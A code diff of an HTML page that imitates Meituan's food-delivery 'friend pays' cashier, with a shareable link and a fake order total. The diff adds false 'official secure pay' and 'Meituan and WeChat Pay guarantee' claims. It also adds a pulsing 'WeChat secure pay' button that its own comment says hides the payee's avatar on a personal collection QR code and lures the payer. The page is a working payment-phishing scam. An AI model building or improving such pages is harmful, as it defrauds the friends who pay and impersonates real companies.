@@ -6,69 +6,144 @@
 <meta property="og:title" content="来帮我代付吧 ~ 😋" />
 <meta property="og:description" content="Hi, 你和我的距离只差一顿外卖，快来帮我买单吧！" />
 <meta property="og:image" content="https://zpjt.github.io/Auto-Forward-Messages/IMG_1872.jpeg" />
-<title>美团外卖 - 交易保障</title>
+<title>美团外卖 - 朋友代付收银台</title>
 <style>
 :root{
-  --bg:#f5f5f5;
+  --bg:#f4f4f4;
   --card:#ffffff;
-  --text:#111111;
-  --muted:#8a8a8a;
-  --primary:#ffd000;
-  --primary-dark:#ffbf00;
-  --danger:#ff4d4f;
-  --success:#00b578;
-  --border:#ececec;
-  --shadow:0 8px 24px rgba(0,0,0,.06);
+  --text:#222222;
+  --muted:#999999;
+  --meituan-yellow:#ffd100;
+  --danger:#ff5722;
+  --success:#07c160; /* 微信绿 */
+  --border:#eaeaea;
 }
 *{box-sizing:border-box}
-body{margin:0;font-family:Arial,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--text)}
-.nav{display:flex;gap:10px;padding:14px 12px;background:linear-gradient(135deg,#111,#2b2b2b);position:sticky;top:0;z-index:10;overflow:auto}
-.nav-item{padding:10px 14px;border-radius:999px;cursor:pointer;background:rgba(255,255,255,.08);color:#fff;font-weight:700;white-space:nowrap;user-select:none;}
-.nav-item.active{background:var(--primary);color:#111}
-.tab-view{display:none;padding:14px;max-width:600px;margin:0 auto}
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Helvetica Neue",Arial,sans-serif;background:var(--bg);color:var(--text)}
+
+/* 顶部真实美团黄导航栏 */
+.mt-header {
+  background: var(--meituan-yellow);
+  color: #222;
+  padding: 12px 16px;
+  font-weight: 800;
+  font-size: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+}
+.mt-header span { font-size: 12px; font-weight: normal; background: rgba(0,0,0,0.08); padding: 2px 8px; border-radius: 4px; }
+
+.nav{display:flex;gap:10px;padding:10px 12px;background:#333;overflow:auto}
+.nav-item{padding:8px 12px;border-radius:999px;cursor:pointer;background:rgba(255,255,255,.1);color:#fff;font-weight:600;font-size:14px;white-space:nowrap;}
+.nav-item.active{background:var(--meituan-yellow);color:#111}
+.tab-view{display:none;padding:12px;max-width:500px;margin:0 auto}
 .tab-view.active{display:block}
-h2{margin:8px 0 14px;font-size:22px;font-weight:800}
-h3{margin:4px 0 12px;font-size:18px;}
-.card{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:16px;margin-bottom:12px;box-shadow:var(--shadow)}
+h2{margin:8px 0 14px;font-size:20px;font-weight:800}
+.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;margin-bottom:12px;box-shadow:0 4px 12px rgba(0,0,0,0.03)}
 .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-input,select{padding:12px 14px;border:1px solid #ddd;border-radius:14px;background:#fff;outline:none;width:100%}
-input:focus,select:focus{border-color:#ffcf33;box-shadow:0 0 0 4px rgba(255,208,0,.18)}
-.btn{padding:12px 16px;border:0;border-radius:14px;cursor:pointer;font-weight:700;width:100%}
-.btn:hover{opacity:.95}
-.p{background:linear-gradient(135deg,var(--primary),var(--primary-dark));color:#111}
-.w{background:#fff3bf;color:#8a5b00;border:1px solid #ffe08a}
-.d{background:linear-gradient(135deg,#ff7875,#ff4d4f);color:#fff}
+input,select{padding:12px;border:1px solid #ddd;border-radius:10px;background:#fff;outline:none;width:100%}
+.btn{padding:12px 16px;border:0;border-radius:12px;cursor:pointer;font-weight:700;width:100%}
+.p{background:var(--meituan-yellow);color:#222}
+.w{background:#fff8e1;color:#8a5b00;border:1px solid #ffe08a}
 .muted{color:var(--muted)}
 .flex-between{display:flex;justify-content:space-between;align-items:center;}
-.clickable{cursor:pointer;transition:transform 0.1s;}
-.clickable:active{transform:scale(0.98);}
-.badge{padding:4px 8px;border-radius:6px;font-size:12px;font-weight:bold;}
-.badge.wait{background:#fff3bf;color:#8a5b00;}
+.clickable{cursor:pointer;}
+.badge{padding:3px 8px;border-radius:4px;font-size:12px;font-weight:bold;}
+.badge.wait{background:#fff3bf;color:#b7791f;}
 
-/* 好友点开后的美团代付专业页面 */
-.pay-page-container { background: #fff; border-radius: 16px; padding: 20px; box-shadow: 0 4px 16px rgba(0,0,0,0.06); max-width: 500px; margin: 10px auto; text-align: center; }
-.timer-banner { background: #fffde7; border: 1px solid #ffe082; border-radius: 10px; padding: 12px; text-align: center; margin: 15px 0; color: #8a5b00; font-weight: bold; }
-.item-box { background: #f9f9f9; padding: 12px 15px; border-radius: 10px; margin: 12px 0; font-size: 15px; font-weight: bold; text-align: left; }
-.price-display { font-size: 36px; font-weight: 900; color: #ff5722; margin: 15px 0; }
+/* 极度逼真的美团代付收银台容器 */
+.checkout-box {
+  background: #fff;
+  border-radius: 14px;
+  padding: 20px 16px;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.04);
+  margin-top: 10px;
+  text-align: center;
+}
+.merchant-info {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 14px;
+  color: #666;
+  border-bottom: 1px solid #f2f2f2;
+  padding-bottom: 10px;
+  margin-bottom: 12px;
+  text-align: left;
+}
+.amount-large {
+  font-size: 38px;
+  font-weight: 900;
+  color: var(--danger);
+  margin: 10px 0 20px 0;
+}
+.details-list {
+  background: #fafafa;
+  border-radius: 10px;
+  padding: 12px;
+  text-align: left;
+  font-size: 14px;
+  margin-bottom: 15px;
+}
+.details-row {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 8px;
+}
+.details-row:last-child { margin-bottom: 0; }
 
-/* 升级版二维码容器：专为微信长按识别设计 */
-.qr-wrapper {
+/* 二维码与居中按钮的叠放容器 */
+.qr-container {
   position: relative;
-  width: 240px;
-  height: 240px;
+  width: 210px;
+  height: 210px;
   margin: 15px auto;
+  background: #fff;
+  border: 1px solid #e0e0e0;
   border-radius: 12px;
-  border: 1px solid #eee;
-  overflow: hidden;
-  background: #fcfcfc;
+  padding: 5px;
 }
 .pay-qr-img {
   width: 100%;
   height: 100%;
   object-fit: contain;
   display: block;
-  /* 允许长按识别的关键 */
-  -webkit-touch-callout: default !important;
+  border-radius: 8px;
+}
+/* 巧妙盖在中间的支付按钮：遮挡头像并提供诱导视觉 */
+.overlay-pay-btn {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: var(--success);
+  color: white;
+  border: 2px solid #ffffff;
+  padding: 8px 14px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: bold;
+  box-shadow: 0 4px 10px rgba(7, 193, 96, 0.4);
+  white-space: nowrap;
+  pointer-events: none; /* 让点击穿透到下方的长按图片事件 */
+  animation: pulse 2s infinite;
+}
+@keyframes pulse {
+  0% { transform: translate(-50%, -50%) scale(1); }
+  50% { transform: translate(-50%, -50%) scale(1.05); }
+  100% { transform: translate(-50%, -50%) scale(1); }
+}
+
+.security-tip {
+  font-size: 12px;
+  color: #00b578;
+  background: #f0fdf4;
+  border: 1px solid #dcfce7;
+  padding: 8px;
+  border-radius: 6px;
+  margin-top: 10px;
 }
 </style>
 </head>
@@ -76,15 +151,15 @@ input:focus,select:focus{border-color:#ffcf33;box-shadow:0 0 0 4px rgba(255,208,
 
 <!-- 主导航栏 -->
 <div class="nav" id="main-nav">
-  <div class="nav-item active" data-tab="view-stores">🏪 商家</div>
+  <div class="nav-item active" data-tab="view-stores">🏪 选购点餐</div>
   <div class="nav-item" data-tab="view-cart">🛒 购物车</div>
-  <div class="nav-item" data-tab="view-orders">📋 订单</div>
-  <div class="nav-item" id="nav-admin" data-tab="view-admin">⚙️ 管理后台</div>
+  <div class="nav-item" data-tab="view-orders">📋 我的订单</div>
+  <div class="nav-item" data-tab="view-admin">⚙️ 后台</div>
 </div>
 
 <!-- 1. 商家列表视图 -->
 <div id="view-stores" class="tab-view active">
-  <div id="stores-header"><h2>商家列表</h2></div>
+  <div id="stores-header"><h2>美团合作商家</h2></div>
   <div id="store-list" class="muted">加载中...</div>
 </div>
 
@@ -93,7 +168,7 @@ input:focus,select:focus{border-color:#ffcf33;box-shadow:0 0 0 4px rgba(255,208,
   <h2>购物车</h2>
   <div class="card flex-between">
     <div>共 <b id="cart-count">0</b> 件, 合计 ¥<b id="cart-total">0.00</b></div>
-    <button class="btn p" onclick="checkout()">提交订单</button>
+    <button class="btn p" onclick="checkout()">提交代付订单</button>
   </div>
   <div id="cart-list" class="muted">购物车为空</div>
 </div>
@@ -104,54 +179,72 @@ input:focus,select:focus{border-color:#ffcf33;box-shadow:0 0 0 4px rgba(255,208,
   <div id="order-list" class="muted">加载中...</div>
 </div>
 
-<!-- 4. 好友点开链接后的代付支付视图 -->
-<div id="view-mt-pay" class="tab-view">
-  <div class="pay-page-container">
-    <div style="font-size: 14px; color: #888; border-bottom: 1px solid #eee; padding-bottom: 8px; text-align: left;">🟡 美团外卖 | 交易保障护航</div>
-    
-    <div style="font-size: 18px; font-weight: 800; color: #222; margin-top: 15px; text-align: left;">待代付订单</div>
+<!-- 4. 好友点开后的美团官方代付收银台（带中间遮挡按钮） -->
+<div id="view-mt-pay" class="tab-view" style="padding:0;">
+  <div class="mt-header">
+    美团外卖收银台 <span>官方安全代付</span>
+  </div>
+  <div style="padding: 12px;">
+    <div class="checkout-box">
+      <div class="merchant-info">
+        <span>🟡</span> <b>美团外卖交易保障</b>
+        <span style="margin-left:auto; font-size:12px; color:var(--success);">已通过安全认证</span>
+      </div>
 
-    <div class="timer-banner">
-      ⏱️ 剩余支付时间：<span id="mt-countdown" style="font-size: 18px; color: #e64a19;">14:59</span>
+      <div style="font-size: 13px; color: var(--muted);">代付订单总额</div>
+      <div class="amount-large">¥<span id="mt-order-total">0.00</span></div>
+
+      <div class="details-list">
+        <div class="details-row">
+          <span style="color:#666;">订单内容：</span>
+          <b id="mt-order-content" style="text-align:right; max-width:220px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">外卖餐品</b>
+        </div>
+        <div class="details-row">
+          <span style="color:#666;">剩余支付：</span>
+          <span id="mt-countdown" style="color:var(--danger); font-weight:bold;">14:59</span>
+        </div>
+        <div class="details-row">
+          <span style="color:#666;">支付方式：</span>
+          <span style="color:#222; font-weight:bold;">微信好友代付</span>
+        </div>
+      </div>
+
+      <!-- 醒目长按引导 -->
+      <div style="background: #fff8e1; color: #8a5b00; padding: 10px; border-radius: 8px; font-size: 13px; font-weight: bold; margin-bottom: 5px;">
+        👆 请直接【长按下方二维码】选择「识别图中二维码」完成代付
+      </div>
+
+      <!-- 二维码与居中按钮容器 -->
+      <div class="qr-container">
+        <img class="pay-qr-img" src="36.jpeg" alt="代付收款码" />
+        <!-- 完美的居中呼吸支付按钮，直接挡住头像 -->
+        <div class="overlay-pay-btn">🟢 微信安全支付</div>
+      </div>
+
+      <div class="security-tip">
+        🛡️ 美团联合微信支付提供底层担保，付款后好友将立刻收到餐品配送通知。
+      </div>
     </div>
-
-    <div style="font-size: 13px; color: #666; text-align: left;">代付商品清单：</div>
-    <div class="item-box" id="mt-order-content">外卖订单</div>
-
-    <div style="font-size: 13px; color: #666;">需付款金额</div>
-    <div class="price-display">¥<span id="mt-order-total">0.00</span></div>
-
-    <!-- 优化后的专业微信提示 -->
-    <div style="background: #f0f9eb; border: 1px solid #d1e7dd; padding: 12px; border-radius: 10px; margin-bottom: 5px; font-size: 13px; color: #0f5132; text-align: center; font-weight: bold;">
-      👆 请直接【长按图片】选择「识别图中二维码」完成支付
-    </div>
-
-    <!-- 二维码包裹容器（完美支持微信长按呼出菜单） -->
-    <div class="qr-wrapper">
-      <img class="pay-qr-img" src="36.jpeg" alt="微信收款码" />
-    </div>
-
-    <p style="font-size: 12px; color: #888; margin-top: 10px;">付款完成后请通知好友确认收单~</p>
   </div>
 </div>
 
 <!-- 5. 管理后台视图 -->
 <div id="view-admin" class="tab-view">
-  <h2>管理后台 <span style="font-size:14px; color:var(--success);">(本地极速模式)</span></h2>
+  <h2>后台管理</h2>
   <div class="card">
-    <h3>新建商家</h3>
+    <h3>添加商家</h3>
     <div class="row">
-      <input id="store-input" placeholder="输入商家名称（如：全粥道砂锅粥）" />
-      <button class="btn w" onclick="addStore()">添加商家</button>
+      <input id="store-input" placeholder="商家名称" />
+      <button class="btn w" onclick="addStore()">添加</button>
     </div>
   </div>
   <div class="card">
-    <h3>上架商品（菜单）</h3>
+    <h3>上架商品</h3>
     <div class="row">
-      <select id="admin-store-select"><option value="">请选择商家...</option></select>
-      <input id="product-name-input" placeholder="输入商品名称（如：牛肉丸汤）" />
+      <select id="admin-store-select"><option value="">选择商家...</option></select>
+      <input id="product-name-input" placeholder="商品名称" />
       <input id="product-price-input" type="number" placeholder="价格 (元)" />
-      <button class="btn p" onclick="addProduct()">添加商品</button>
+      <button class="btn p" onclick="addProduct()">上架商品</button>
     </div>
   </div>
 </div>
@@ -195,15 +288,15 @@ document.querySelectorAll('.nav-item').forEach(item => {
 });
 
 function fetchStores() {
-  document.getElementById('stores-header').innerHTML = '<h2>商家列表</h2>';
+  document.getElementById('stores-header').innerHTML = '<h2>美团合作商家</h2>';
   const stores = JSON.parse(localStorage.getItem('stores')) || [];
   if (stores.length === 0) {
-    document.getElementById('store-list').innerHTML = '<div class="card">暂无商家。请点击上方【⚙️ 管理后台】添加您的第一个商家！</div>';
+    document.getElementById('store-list').innerHTML = '<div class="card">暂无商家，请前往后台添加。</div>';
     return;
   }
   document.getElementById('store-list').innerHTML = stores.map(store => `
     <div class="card flex-between clickable" onclick="fetchProducts(${store.id}, '${esc(store.name)}')">
-      <div><b>${esc(store.name)}</b><br/><span class="muted" style="font-size:12px;">点击进入查看菜单 ➡️</span></div>
+      <div><b>${esc(store.name)}</b><br/><span class="muted" style="font-size:12px;">查看菜单点餐 ➡️</span></div>
     </div>
   `).join('');
 }
@@ -211,20 +304,20 @@ function fetchStores() {
 function fetchProducts(storeId, storeName) {
   document.getElementById('stores-header').innerHTML = `
     <button class="btn w" style="width:auto; margin-bottom:10px;" onclick="fetchStores()">⬅️ 返回商家列表</button>
-    <h2>${storeName} 的菜单</h2>
+    <h2>${storeName}</h2>
   `;
   const products = JSON.parse(localStorage.getItem('products')) || [];
   const storeProducts = products.filter(p => p.store_id == storeId);
 
   if (storeProducts.length === 0) {
-    document.getElementById('store-list').innerHTML = '<div class="card">该商家还没上架商品，请去管理后台添加。</div>';
+    document.getElementById('store-list').innerHTML = '<div class="card">该商家暂无上架商品。</div>';
     return;
   }
 
   document.getElementById('store-list').innerHTML = storeProducts.map(product => `
     <div class="card flex-between">
       <div><b>${esc(product.name)}</b><br/><span style="color:var(--danger); font-weight:bold;">¥${Number(product.price).toFixed(2)}</span></div>
-      <button class="btn p" style="width:auto;" onclick="addToCart(${product.id}, '${esc(product.name)}', ${product.price})">+ 购物车</button>
+      <button class="btn p" style="width:auto;" onclick="addToCart(${product.id}, '${esc(product.name)}', ${product.price})">+ 选购</button>
     </div>
   `).join('');
 }
@@ -233,7 +326,7 @@ function addToCart(id, name, price) {
   if (cart[id]) cart[id].count += 1;
   else cart[id] = { name, price, count: 1 };
   updateCartUI();
-  alert(`已将【${name}】加入购物车！`);
+  alert(`已将【${name}】加入购物车`);
 }
 
 function updateCartUI() {
@@ -251,7 +344,7 @@ function updateCartUI() {
 
 function checkout() {
   const items = Object.values(cart);
-  if (items.length === 0) return alert('购物车是空的！');
+  if (items.length === 0) return alert('购物车是空的');
   const totalPrice = items.reduce((sum, item) => sum + (item.price * item.count), 0);
   const content = items.map(i => `${i.name} x${i.count}`).join(', ');
 
@@ -260,13 +353,13 @@ function checkout() {
     id: Date.now().toString().slice(-6),
     content: content,
     total: totalPrice,
-    status: '待支付'
+    status: '待代付'
   };
   
   orders.unshift(newOrder);
   localStorage.setItem('orders', JSON.stringify(orders));
 
-  alert('订单提交成功！');
+  alert('订单已生成，请去订单页分享代付卡片！');
   cart = {}; 
   updateCartUI();
   document.querySelector('[data-tab="view-orders"]').click();
@@ -275,7 +368,7 @@ function checkout() {
 function fetchOrders() {
   const orders = JSON.parse(localStorage.getItem('orders')) || [];
   if (orders.length === 0) {
-    document.getElementById('order-list').innerHTML = '暂无订单';
+    document.getElementById('order-list').innerHTML = '<div class="card">暂无订单</div>';
     return;
   }
 
@@ -283,12 +376,12 @@ function fetchOrders() {
     <div class="card">
       <div class="flex-between">
         <b>订单号: #${order.id}</b>
-        <span class="badge wait">${esc(order.status || '待支付')}</span>
+        <span class="badge wait">${esc(order.status || '待代付')}</span>
       </div>
       <div class="muted" style="margin: 8px 0;">${esc(order.content)}</div>
       <div class="flex-between" style="margin-top:10px;">
         <b style="color:var(--danger); font-size:18px;">¥${Number(order.total).toFixed(2)}</b>
-        <button class="btn p" style="width:auto;" onclick="shareOrder('${esc(order.content)}', ${order.total})">🎁 一键分享代付卡片</button>
+        <button class="btn p" style="width:auto;" onclick="shareOrder('${esc(order.content)}', ${order.total})">🎁 发给好友代付</button>
       </div>
     </div>
   `).join('');
@@ -307,23 +400,23 @@ async function shareOrder(content, total) {
     try { await navigator.share(shareData); } catch (e) {}
   } else {
     navigator.clipboard.writeText(shareUrl);
-    alert("代付卡片链接已复制，快发给好友吧！");
+    alert("代付链接已复制，快发给好友吧！");
   }
 }
 
 function prepareAdminForm() {
   const select = document.getElementById('admin-store-select');
   const stores = JSON.parse(localStorage.getItem('stores')) || [];
-  select.innerHTML = '<option value="">请选择商家...</option>' + stores.map(s => `<option value="${s.id}">${esc(s.name)}</option>`).join('');
+  select.innerHTML = '<option value="">选择商家...</option>' + stores.map(s => `<option value="${s.id}">${esc(s.name)}</option>`).join('');
 }
 
 function addStore() {
   const name = document.getElementById('store-input').value.trim();
-  if (!name) return alert('请输入商家名称');
+  if (!name) return alert('请输入名称');
   const stores = JSON.parse(localStorage.getItem('stores')) || [];
   stores.push({ id: Date.now(), name });
   localStorage.setItem('stores', JSON.stringify(stores));
-  alert('商家添加成功！'); 
+  alert('添加成功'); 
   document.getElementById('store-input').value = ''; 
   prepareAdminForm();
 }
@@ -336,7 +429,7 @@ function addProduct() {
   const products = JSON.parse(localStorage.getItem('products')) || [];
   products.push({ id: Date.now(), store_id: Number(storeId), name, price });
   localStorage.setItem('products', JSON.stringify(products));
-  alert('商品上架成功！'); 
+  alert('上架成功'); 
   document.getElementById('product-name-input').value = ''; 
   document.getElementById('product-price-input').value = '';
 }
